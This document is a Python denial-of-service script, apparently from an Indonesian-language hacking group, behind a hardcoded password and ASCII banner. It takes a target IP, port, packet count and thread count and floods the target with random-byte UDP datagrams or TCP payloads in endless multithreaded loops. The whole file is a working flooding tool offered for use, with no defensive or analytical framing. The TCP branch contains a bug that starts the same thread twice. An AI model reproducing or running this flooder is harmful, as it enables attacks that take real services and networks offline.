import random
import socket
import threading
import os, sys
import time

password = input("[•] Account :")
time.sleep(2)
if password=="XXBR":
  print("[✓] Akun  Berhasil Masuk")
  time.sleep(2)
  os.system("clear")
  print("\033[1;34;40m=>Build By X-THREE<=")
  time.sleep(1)
  print("\033[1;34;40m=>YT XXBR<=")
  time.sleep(1)
  print("\033[1;34;40m=>JANGAN BUAT ABUSE KONTOL<=")
  time.sleep(3)
  os.system("clear")
  print('''\033[1;36;40m
███████╗██╗░░██╗███████╗  ░░░░░░
╚════██║╚██╗██╔╝╚════██║  ░░░░░░
░░███╔═╝░╚███╔╝░░░███╔═╝  █████╗
██╔══╝░░░██╔██╗░██╔══╝░░  ╚════╝
███████╗██╔╝╚██╗███████╗  ░░░░░░
╚══════╝╚═╝░░╚═╝╚══════╝  ░░░░░░

██╗░░██╗██╗░░██╗██████╗░██████╗░
╚██╗██╔╝╚██╗██╔╝██╔══██╗██╔══██╗
░╚███╔╝░░╚███╔╝░██████╦╝██████╔╝
░██╔██╗░░██╔██╗░██╔══██╗██╔══██╗
██╔╝╚██╗██╔╝╚██╗██████╦╝██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝''')
  
  choice = str(input("\033[1;31;40mAttack Ke (Udp/Tcp) \033[1;31;40m<===> "))
  ip = str(input("\033[1;31;40mIp Target \033[1;31;40m<===> "))
  port = int(input("\033[1;31;40mPort Target \033[1;31;40m<===> "))
  times = int(input("\033[1;31;40mKirim Packets \033[1;31;40m<===> "))
  threads = int(input("\033[1;31;40mKirim Threads \033[1;31;40m<===> "))
  def xxbr():
  	data = random._urandom(1050)
  	while True:
  		try:
  			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  			addr = (str(ip),int(port))
  			for x in range(times):
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  			print("\033[1;36;40m[•]Attack XXBR & ZXZ For Ip %s Port %s"%(ip,port))
  		except:
  			print("\033[1;31;40m× Warning!")
  
  def xxbr2():
  	data = random._urandom(102400)
  	while True:
  		try:
  			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  			s.connect((ip,port))
  			s.send(data)
  			for x in range(times):
  				s.send(data)
  			print("\033[1;36;40m[•]Attack XXBR & ZXZ For Ip %s Port %s"%(ip,port))
  		except:
  			s.close()
  			print("\033[1;31;40m× Warning!")
              
  for y in range(threads):
  	if choice == 'Udp':
  		th = threading.Thread(target = xxbr)
  		th.start()
  	elif choice == 'Tcp':
  		th = threading.Thread(target = xxbr2)
  		th.start()
  		th.start()
else:
  print("\033[1;31;40m[!] Wrong Password!")

